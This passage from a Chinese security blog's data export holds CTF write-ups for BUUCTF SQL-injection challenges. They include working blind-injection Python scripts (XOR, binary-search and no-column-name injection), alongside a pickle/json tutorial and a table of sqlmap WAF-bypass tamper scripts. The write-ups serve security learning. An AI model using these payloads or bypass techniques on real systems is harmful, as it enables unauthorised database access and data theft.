href='https://www.jianshu.com/p/27df5c67157c' target=\"_blank\" rel=\"noopener\">异或注入</a></p>\n<p>直接给出payload：1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</p>\n<h3 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h3><p>开始编写盲注脚本，这里思路有很多，有枚举法，二分法，还看到过北邮大佬的延时注入，最简单的一种是枚举，直接贴出：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">words = <span class=\"string\">\"Hello, glzjin wants a girlfriend.\"</span></span><br><span class=\"line\">flag=<span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">    print(<span class=\"string\">'----------------------------------------------------'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">129</span>):<span class=\"comment\">#ascii值范围</span></span><br><span class=\"line\">        data=&#123;<span class=\"string\">\"id\"</span>:<span class=\"string\">\"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))\"</span> %(i,j)&#125;</span><br><span class=\"line\">        re = requests.post(url=url,data=data).text</span><br><span class=\"line\">        <span class=\"comment\">#如果回显为words内容，打印出j转换后的字符</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> words <span class=\"keyword\">in</span> re:</span><br><span class=\"line\">            flag+=chr(j)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>大概跑个5分钟,即得flag.</p>\n<p><img src=\"/images/image-20200429215354204.png\" alt=\"image-20200429215354204\"></p>\n<p>第二种是这次需要学习的二分法。</p>\n<p>关于二分法的知识：</p>\n<blockquote>\n<ul>\n<li><p>首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。</p>\n</li>\n<li><p>如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。</p>\n</li>\n<li><p>如果某一步数组为空，则表示找不到目标元素。</p>\n</li>\n</ul>\n</blockquote>\n<p>也很好理解，对于这题，首先取第一个字符的Ascii值同(32,130)的中间值相比较,如果正好相等，则输出字符，如果Ascii的值大于中间值，则取中间值到最大值这一范围的中间值继续同字符的Ascii值比较，重复上述操作直到两个值相等为止，最终输出整个字符串。按照这个思路编写脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://c23802b8-f4bb-43f3-ae9e-aedcd32d9481.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">result = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">\tmin_value = <span class=\"number\">33</span></span><br><span class=\"line\">\tmax_value = <span class=\"number\">130</span></span><br><span class=\"line\">\tmid = (min_value+max_value)//<span class=\"number\">2</span> <span class=\"comment\">#中值</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(min_value&lt;max_value):</span><br><span class=\"line\">\t\tpayload =&#123;<span class=\"string\">\"id\"</span> : <span class=\"string\">\"0^\"</span> + <span class=\"string\">\"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)\"</span>.format(i,mid)&#125;</span><br><span class=\"line\">\t\thtml = requests.post(url,data=payload)</span><br><span class=\"line\">\t\tprint(payload)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">\"Hello, glzjin wants a girlfriend.\"</span> <span class=\"keyword\">in</span> html.text:</span><br><span class=\"line\">            \t<span class=\"comment\">#ascii值比mid值大</span></span><br><span class=\"line\">\t\t\tmin_value = mid+<span class=\"number\">1</span>   </span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tmax_value = mid</span><br><span class=\"line\">\t\tmid = (min_value+max_value)//<span class=\"number\">2</span></span><br><span class=\"line\">    \t<span class=\"comment\">#找不到目标元素时停止</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(chr(mid)==<span class=\"string\">\" \"</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\tresult += chr(mid)</span><br><span class=\"line\">\tprint(result)</span><br><span class=\"line\">print(<span class=\"string\">\"fina flag:\"</span>,result)</span><br></pre></td></tr></table></figure>\n\n<p>同样得到flag，并且速度比枚举法要快的多。</p>\n<p><img src=\"/images/image-20200429215721640.png\" alt=\"image-20200429215721640\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>拓展了盲注知识</li>\n<li>脚本技能又增长了一点点</li>\n</ul>\n","categories":["CTF"],"tags":["sql"]},{"title":"不含in的注入","url":"/2020/04/16/note8/","content":"<p>在buu平台做题时遇见了一种新的注入姿势，记录下来。</p>\n<a id=\"more\"></a>\n\n<h5 id=\"题目：-GYCTF2020-Ezsqli\"><a href=\"#题目：-GYCTF2020-Ezsqli\" class=\"headerlink\" title=\"题目： [GYCTF2020]Ezsqli\"></a>题目： [GYCTF2020]Ezsqli</h5><p>打开题目链接出现一张威武大哥照片，在网页底部找到查询框猜测为注入：</p>\n<p><img src=\"/images/image-20200416214447439.png\" alt=\"image-20200416214447439\"></p>\n<p>一番瞎操作无果下fuzz一下，过滤了and,or,join,union select,in,information_schema_tables等关键词，常规注入无法进行</p>\n<p>于是很自觉的打开了百度搜wp</p>\n<p>学到了新姿势，使用sys.x$schema_flattened_keys代替information_schema进行盲注，参考一波大佬的讲解<a href=\"https://zhuanlan.zhihu.com/p/101759537?from_voters_page=true\" target=\"_blank\" rel=\"noopener\">无须in的盲注</a><br>以及<a href=\"https://blog.csdn.net/weixin_43536759/article/details/104847916\" target=\"_blank\" rel=\"noopener\">MySQL和MariaDB提取表和列的方法</a></p>\n<p>嫖一波大佬的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">flag=<span class=\"string\">''</span></span><br><span class=\"line\">url=<span class=\"string\">'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/index.php'</span></span><br><span class=\"line\">link=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        payload = <span class=\"string\">\"1 &amp;&amp; ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),\"</span>+str(i)+<span class=\"string\">\",1))=\"</span>+str(j)+<span class=\"string\">\"#\"</span></span><br><span class=\"line\">        data=&#123;</span><br><span class=\"line\">            <span class=\"string\">'id'</span>: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res=requests.post(url,data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Nu1L'</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">            flag=flag+chr(j)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            link=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>得到表名</p>\n<p><img src=\"/images/image-20200416221001579.png\" alt=\"image-20200416221001579\"></p>\n<p>继续看wp，又学到无列名注入，参考：<a href=\"https://zhuanlan.zhihu.com/p/98206699?utm_source=wechat_session\" target=\"_blank\" rel=\"noopener\">二向箔安全学院无列名注入</a></p>\n<p>颖奇L’Amore师傅的脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Author: 颖奇L'Amore</span></span><br><span class=\"line\"><span class=\"string\">Blog: www.gem-love.com</span></span><br><span class=\"line\"><span class=\"string\">本文链接： https://www.gem-love.com/ctf/1669.html</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url = <span class=\"string\">'http://5564dc2f-bb51-401c-b40f-3a82ae27e269.node3.buuoj.cn/'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">trans</span><span class=\"params\">(flag)</span>:</span></span><br><span class=\"line\">    res = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> flag:</span><br><span class=\"line\">        res += hex(ord(i))</span><br><span class=\"line\">    res = <span class=\"string\">'0x'</span> + res.replace(<span class=\"string\">'0x'</span>,<span class=\"string\">''</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">500</span>): <span class=\"comment\">#这循环一定要大 不然flag长的话跑不完</span></span><br><span class=\"line\">    hexchar = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>, <span class=\"number\">126</span>):</span><br><span class=\"line\">        hexchar = trans(flag+ chr(char))</span><br><span class=\"line\">        payload = <span class=\"string\">'2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span>.format(hexchar)</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">                <span class=\"string\">'id'</span>:payload</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        r = requests.post(url=url, data=data)</span><br><span class=\"line\">        text = r.text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Nu1L'</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            flag += chr(char<span class=\"number\">-1</span>)</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>1.information_schema无法使用时使用sys.x$schema_flattened_keys替代，另外还可使用mysql.innodb_table_stats显示更多表：</p>\n<p><img src=\"/images/image-20200416223908444.png\" alt=\"image-20200416223908444\"></p>\n<p>2.无列名注入，还有待学习</p>\n<p>3.mysql小tips：MySQL遇到hex会自动转成字符串，所以脚本进行了hex()操作。</p>\n<p>4.想像大佬们一样写脚本</p>\n","categories":["CTF"],"tags":["sql"]},{"title":"python序列化和反序列化","url":"/2020/07/10/python_serialize/","content":"<p>python的序列化和反序列化问题主要涉及两个模块：pickle，json</p>\n<a id=\"more\"></a>\n\n<h3 id=\"Pickle\"><a href=\"#Pickle\" class=\"headerlink\" title=\"Pickle\"></a>Pickle</h3><p>翻阅手册</p>\n<blockquote>\n<p>模块 pickle实现了对一个 Python 对象结构的二进制序列化和反序列化。 “pickling” 是将 Python 对象及其所拥有的层次结构转化为一个字节流的过程，而 “unpickling” 是相反的操作，会将（来自一个 binary file 或者 bytes-like object的）字节流转化回一个对象层次结构。 pickling（和 unpickling）也被称为“序列化”, “编组” 或者 “平面化”。而为了避免混乱，此处采用术语 “封存 (pickling)” 和 “解封 (unpickling)”。</p>\n</blockquote>\n<h4 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h4><ul>\n<li>pickle所使用的数据格式仅可用于 Python</li>\n<li>pickle格式使用二进制存储</li>\n<li>存储之后人类不可读</li>\n<li>存在风险</li>\n</ul>\n<h4 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h4><h5 id=\"pickle-dump\"><a href=\"#pickle-dump\" class=\"headerlink\" title=\"pickle.dump\"></a>pickle.dump</h5><p>将对象序列化（即封存）并写入已打开的文件中。</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(<span class=\"string\">'test.txt'</span>,<span class=\"string\">'wb'</span>)  </span><br><span class=\"line\">data = &#123;<span class=\"string\">'e1'</span>:<span class=\"string\">'python'</span>,<span class=\"string\">'e2'</span>:<span class=\"string\">'serialize'</span>,<span class=\"string\">'e3'</span>:<span class=\"string\">'is'</span>,<span class=\"string\">'e4'</span>:<span class=\"string\">'good'</span>&#125;</span><br><span class=\"line\">pickle.dump(data,f)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710134953.png\" alt=\"\"></p>\n<h5 id=\"pickle-dumps\"><a href=\"#pickle-dumps\" class=\"headerlink\" title=\"pickle.dumps\"></a>pickle.dumps</h5><p>将对象序列化</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"> </span><br><span class=\"line\">data = &#123;<span class=\"string\">'e1'</span>:<span class=\"string\">'python'</span>,<span class=\"string\">'e2'</span>:<span class=\"string\">'serialize'</span>,<span class=\"string\">'e3'</span>:<span class=\"string\">'is'</span>,<span class=\"string\">'e4'</span>:<span class=\"string\">'good'</span>&#125;</span><br><span class=\"line\">result = pickle.dumps(data)</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135217.png\" alt=\"\"></p>\n<h5 id=\"pickle-load\"><a href=\"#pickle-load\" class=\"headerlink\" title=\"pickle.load\"></a>pickle.load</h5><p>从文件中读取序列化字符串并反序列化</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\">f = open(<span class=\"string\">'test.txt'</span>,<span class=\"string\">'rb'</span>)</span><br><span class=\"line\">result = pickle.load(f)</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135647.png\" alt=\"\"></p>\n<h5 id=\"pickle-loads\"><a href=\"#pickle-loads\" class=\"headerlink\" title=\"pickle.loads\"></a>pickle.loads</h5><p>将序列化字符串反序列化</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"> </span><br><span class=\"line\">data = &#123;<span class=\"string\">'e1'</span>:<span class=\"string\">'python'</span>,<span class=\"string\">'e2'</span>:<span class=\"string\">'serialize'</span>,<span class=\"string\">'e3'</span>:<span class=\"string\">'is'</span>,<span class=\"string\">'e4'</span>:<span class=\"string\">'good'</span>&#125;</span><br><span class=\"line\">result = pickle.dumps(data)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">reverse = pickle.loads(result)</span><br><span class=\"line\">print(reverse)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710135849.png\" alt=\"\"></p>\n<h3 id=\"Json\"><a href=\"#Json\" class=\"headerlink\" title=\"Json\"></a>Json</h3><blockquote>\n<p>JSON (JavaScript Object Notation)，是一个受 JavaScript 的对象字面量语法启发的轻量级数据交换格式，尽管它不仅仅是一个严格意义上的 JavaScript 的字集 。</p>\n</blockquote>\n<p>JSON序列化：将Python内置的数据类型序列化为JSON格式，用来数据存储或数据交换。</p>\n<h4 id=\"特点-1\"><a href=\"#特点-1\" class=\"headerlink\" title=\"特点\"></a>特点</h4><ul>\n<li>人类可读</li>\n<li>采用文本序列化格式，输出 unicode 文本</li>\n<li>可互操作，在Python系统之外广泛使用</li>\n<li>相比pickle较为安全</li>\n</ul>\n<h4 id=\"方法-1\"><a href=\"#方法-1\" class=\"headerlink\" title=\"方法\"></a>方法</h4><p>方法名和pickle相同，但主要是类型的转换</p>\n<h5 id=\"json-dumps\"><a href=\"#json-dumps\" class=\"headerlink\" title=\"json.dumps\"></a>json.dumps</h5><p>将dict类型的数据转成str</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\">  </span><br><span class=\"line\">data = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'python'</span>,<span class=\"string\">'sex'</span>:<span class=\"string\">'boy'</span>,<span class=\"string\">'age'</span>:<span class=\"number\">18</span>&#125;  </span><br><span class=\"line\">      </span><br><span class=\"line\">result = json.dumps(data)   </span><br><span class=\"line\"></span><br><span class=\"line\">print(type(data))</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(type(result))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710150440.png\" alt=\"\"></p>\n<h5 id=\"json-dump\"><a href=\"#json-dump\" class=\"headerlink\" title=\"json.dump\"></a>json.dump</h5><p>将dict类型的数据转换类型，并写入到json文件中</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\">  </span><br><span class=\"line\">data = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'python'</span>,<span class=\"string\">'sex'</span>:<span class=\"string\">'boy'</span>,<span class=\"string\">'age'</span>:<span class=\"number\">18</span>&#125;  </span><br><span class=\"line\">      </span><br><span class=\"line\">filetest = (<span class=\"string\">'test.txt'</span>)  </span><br><span class=\"line\"></span><br><span class=\"line\">result = json.dumps(data)   </span><br><span class=\"line\"><span class=\"keyword\">with</span> open(filetest, <span class=\"string\">\"w\"</span>) <span class=\"keyword\">as</span> f:  </span><br><span class=\"line\">  f.write(result)  </span><br><span class=\"line\">  f.close()  </span><br><span class=\"line\">  </span><br><span class=\"line\">json.dump(data, open(filetest, <span class=\"string\">\"w\"</span>))</span><br></pre></td></tr></table></figure>\n\n<p>写入前需先dumps转换成类型，直接存入会报错</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710150639.png\" alt=\"\"></p>\n<h5 id=\"json-loads\"><a href=\"#json-loads\" class=\"headerlink\" title=\"json.loads\"></a>json.loads</h5><p>将str类型的数据转成dict</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\">  </span><br><span class=\"line\">data = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">'python'</span>,<span class=\"string\">'sex'</span>:<span class=\"string\">'boy'</span>,<span class=\"string\">'age'</span>:<span class=\"number\">18</span>&#125;  </span><br><span class=\"line\">      </span><br><span class=\"line\">result = json.dumps(data) </span><br><span class=\"line\">reverse = json.loads(result)  </span><br><span class=\"line\"></span><br><span class=\"line\">print(type(data))</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(type(result))</span><br><span class=\"line\">print(reverse)</span><br><span class=\"line\">print(type(reverse))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200710151244.png\" alt=\"\"></p>\n<h5 id=\"json-load\"><a href=\"#json-load\" class=\"headerlink\" title=\"json.load\"></a>json.load</h5><p>从文件中读取数据，将str类型的数据转成dict</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> json  </span><br><span class=\"line\"> </span><br><span class=\"line\">filetest = (<span class=\"string\">'test.txt'</span>)  </span><br><span class=\"line\"> </span><br><span class=\"line\">result = json.load(open(filetest))   </span><br><span class=\"line\"> </span><br><span class=\"line\">print(result) </span><br><span class=\"line\">print(type(result))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"C:/Users/15363/AppData/Roaming/Typora/typora-user-images/image-20200710151612475.png\" alt=\"image-20200710151612475\"></p>\n","categories":["python"],"tags":["serialize"]},{"title":"sqlmap脚本速查","url":"/2020/07/20/sqlmap_temper/","content":"<p>把自己tamper里的脚本用法在网上搜了下</p>\n<a id=\"more\"></a>\n\n\n\n<table>\n<thead>\n<tr>\n<th align=\"left\">脚本名称</th>\n<th>作用说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">apostrophemask.py</td>\n<td>将引号替换成UTF-8，用于过滤单引号</td>\n</tr>\n<tr>\n<td align=\"left\">apostrphenullencode.py</td>\n<td>用非法双字节Unicode字符替换单引号</td>\n</tr>\n<tr>\n<td align=\"left\">appendnullbyte.py</td>\n<td>在有效负荷的结束位置加载零字节字符编码</td>\n</tr>\n<tr>\n<td align=\"left\">base64encode.py</td>\n<td>替换成base64编码</td>\n</tr>\n<tr>\n<td align=\"left\">between.py</td>\n<td>用not between 0 and替换大于号，用between and替换等于号</td>\n</tr>\n<tr>\n<td align=\"left\">bluecoat.py</td>\n<td>在SQL语句之后用有效的随机空白替换空格符，随后用like替换等于号</td>\n</tr>\n<tr>\n<td align=\"left\">chardoubleencode.py</td>\n<td>对给定的payload全部字符使用双重url编码</td>\n</tr>\n<tr>\n<td align=\"left\">charencode.py</td>\n<td>对给定的payload全部字符使用URL编码，例如SE-&gt; ％53％45</td>\n</tr>\n<tr>\n<td align=\"left\">charunicodeencode.py</td>\n<td>字符串Unicode编码，例如SE-&gt;％u0053％u0045</td>\n</tr>\n<tr>\n<td align=\"left\">charunicodeescape.py</td>\n<td>Unicode转义给定有效负载中的未编码字符，例如SE-&gt; \\ u0053 \\ u0045</td>\n</tr>\n<tr>\n<td align=\"left\">commalesslimit.py</td>\n<td>用’LIMIT N OFFSET M’替换（MySQL）实例，例如’LIMIT M,N’</td>\n</tr>\n<tr>\n<td align=\"left\">commalessmid.py</td>\n<td>用’MID（A FROM B FOR C）’替换（MySQL）实例，例如’MID(A,B,C)’</td>\n</tr>\n<tr>\n<td align=\"left\">commentbeforeparentheses.py</td>\n<td>在括号前加（内联）注释（例如（（-&gt; / ** /（）</td>\n</tr>\n<tr>\n<td align=\"left\">concat2concatws.py</td>\n<td>用’CONCAT_WS(MID(CHAR(0),0,0),A,B)’ 等价物替换（MySQL）实例，例如’CONCAT(A,B)’</td>\n</tr>\n<tr>\n<td align=\"left\">equaltolike.py</td>\n<td>将等号替换为like</td>\n</tr>\n<tr>\n<td align=\"left\">escapequotes.py</td>\n<td>斜杠转义单引号和双引号</td>\n</tr>\n<tr>\n<td align=\"left\">greatest.py</td>\n<td>绕过对大于号的过滤，用GREATEST替换大于号</td>\n</tr>\n<tr>\n<td align=\"left\">halfversionedmorekeywords.py</td>\n<td>当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释</td>\n</tr>\n<tr>\n<td align=\"left\">hex2char.py</td>\n<td>替换每个（MySQL）0x等效的CONCAT（CHAR（），…）编码字符串</td>\n</tr>\n<tr>\n<td align=\"left\">htmlencode.py</td>\n<td>HTML编码所有非字母数字字符</td>\n</tr>\n<tr>\n<td align=\"left\">ifnull2casewhenisnull.py-</td>\n<td>替换’IFNULL( A，B)’与’CASE WHEN ISNULL（A）THEN（B）ELSE（A）END’对应</td>\n</tr>\n<tr>\n<td align=\"left\">ifnull2ifsnull.py</td>\n<td>绕过对ifnull的过滤，替换类似IFNULL(A,B)为IF(ISNULL(A),B,A)</td>\n</tr>\n<tr>\n<td align=\"left\">informationschemacomment.py</td>\n<td>在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /）</td>\n</tr>\n<tr>\n<td align=\"left\">least.py</td>\n<td>用’LEAST’对应替换大于运算符（’&gt;’）</td>\n</tr>\n<tr>\n<td align=\"left\">lowercase.py</td>\n<td>用小写值替换每个关键字字符</td>\n</tr>\n<tr>\n<td align=\"left\">luanginx.py</td>\n<td>LUA-Nginx WAF绕过（例如Cloudflare）</td>\n</tr>\n<tr>\n<td align=\"left\">modsecurityversioned.py</td>\n<td>包含带有（MySQL）版本注释的完整查询</td>\n</tr>\n<tr>\n<td align=\"left\">multiplespaces.py</td>\n<td>围绕SQL关键字添加多个空格</td>\n</tr>\n<tr>\n<td align=\"left\">modsecurityversioned.py</td>\n<td>过滤空格，使用MySQL内联注释的方式进行注入</td>\n</tr>\n<tr>\n<td align=\"left\">modsecurityzeroversioned.py</td>\n<td>使用MySQL内联注释的方式进行注入</td>\n</tr>\n<tr>\n<td align=\"left\">multiplespaces.py</td>\n<td>在SQL关键字周围添加多个空格</td>\n</tr>\n<tr>\n<td align=\"left\">nonrecursivereplacement.py</td>\n<td>作为双重查询语句，用双重语句替换预定义的SQL关键字</td>\n</tr>\n<tr>\n<td align=\"left\">overlongutf8.py</td>\n<td>将给定有效载荷中的所有（非字母数字）字符转换为超长UTF8</td>\n</tr>\n<tr>\n<td align=\"left\">overlongutf8more.py</td>\n<td>将给定有效载荷中的所有字符转换为超长UTF8</td>\n</tr>\n<tr>\n<td align=\"left\">percentage.py</td>\n<td>在每个字符前面添加一个百分号（’％’）</td>\n</tr>\n<tr>\n<td align=\"left\">plus2concat.py</td>\n<td>替换加号运算符（’+’）与（MsSQL）函数CONCAT（）对应</td>\n</tr>\n<tr>\n<td align=\"left\">plus2fnconcat.py</td>\n<td>用（MsSQL）ODBC函数{fn CONCAT（）}替换加号（’+’）对应项</td>\n</tr>\n<tr>\n<td align=\"left\">randomcase.py</td>\n<td>随机大小写</td>\n</tr>\n<tr>\n<td align=\"left\">randomcomments.py</td>\n<td>用/**/分割SQL关键字</td>\n</tr>\n<tr>\n<td align=\"left\">securesphere.py</td>\n<td>追加特制的字符串</td>\n</tr>\n<tr>\n<td align=\"left\">sp_password.py</td>\n<td>从DBMS日志的自动模糊处理的有效载荷追加sp_password</td>\n</tr>\n<tr>\n<td align=\"left\">space2comment.py</td>\n<td>将空格替换成/**/</td>\n</tr>\n<tr>\n<td align=\"left\">space2dash.py</td>\n<td>用短划线注释（’-‘）替换空格字符（’’），后跟一个随机字符串和一个新的行（’\\ n’）</td>\n</tr>\n<tr>\n<td align=\"left\">space2hash.py</td>\n<td>将空格替换为#号，并添加一个随机字符串和换行符</td>\n</tr>\n<tr>\n<td align=\"left\">space2morecomment.py</td>\n<td>替换（MySQL）带注释’/ ** _ ** /‘ 的空格字符（’’）实例</td>\n</tr>\n<tr>\n<td align=\"left\">space2moreshash.py</td>\n<td>将空格替换为#号，并添加一个随机字符串和换行符</td>\n</tr>\n<tr>\n<td align=\"left\">space2mssqlblank.py(mssql)</td>\n<td>将空格替换成其他空符号</td>\n</tr>\n<tr>\n<td align=\"left\">space2mysqlblank.py</td>\n<td>将空格替换为其他空白符号(适用于MySQL)</td>\n</tr>\n<tr>\n<td align=\"left\">space2mysqlhash.py</td>\n<td>将空格替换为–，并添加一个换行符</td>\n</tr>\n<tr>\n<td align=\"left\">space2mssqlhash.py</td>\n<td>将空格替换为#号，并添加一个换行符</td>\n</tr>\n<tr>\n<td align=\"left\">space2plus.py</td>\n<td>用+号代替空格</td>\n</tr>\n<tr>\n<td align=\"left\">space2randomblank.py</td>\n<td>将空格替换为其他有效字符</td>\n</tr>\n<tr>\n<td align=\"left\">substring2leftright.py</td>\n<td>用LEFT和RIGHT替换PostgreSQL SUBSTRING</td>\n</tr>\n<tr>\n<td align=\"left\">symbolicologic.py</td>\n<td>用其符号对应物（&amp;&amp;和||）替换AND和OR逻辑运算符</td>\n</tr>\n<tr>\n<td align=\"left\">unionalltounion.py</td>\n<td>用UNION SELECT对应项替换UNION ALL SELECT的实例</td>\n</tr>\n<tr>\n<td align=\"left\">unmagicquotes.py</td>\n<td>用一个多字节组合和末尾通用注释一起替换空格</td>\n</tr>\n<tr>\n<td align=\"left\">uppercase.py</td>\n<td>用大写值替换每个关键字字符</td>\n</tr>\n<tr>\n<td align=\"left\">unionalltounion.py</td>\n<td>将union all select 替换成union select</td>\n</tr>\n<tr>\n<td align=\"left\">varnish.py</td>\n<td>附加HTTP标头’X-originating-IP’以绕过Varnish防火墙</td>\n</tr>\n<tr>\n<td align=\"left\">versionedkeywords.py</td>\n<td>用（MySQL）版本注释将每个非功能性关键字括起来</td>\n</tr>\n<tr>\n<td align=\"left\">versionedmorekeywords.py</td>\n<td>每个关键字包含（MySQL）版本注释</td>\n</tr>\n<tr>\n<td align=\"left\">xforwardedfor.py</td>\n<td>附加伪造的HTTP标头’X-Forwarded-For’</td>\n</tr>\n</tbody></table>\n<p>​<br>​    </p>\n","categories":["tool"],"tags":["sqlmap"]},{"title":"vulnhub——cengbox系列","url":"/2021/01/01/vulnhub_cengbox/","content":"<h2 id=\"cengbox1\"><a href=\"#cengbox1\" class=\"headerlink\" title=\"cengbox1\"></a>cengbox1</h2><h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" 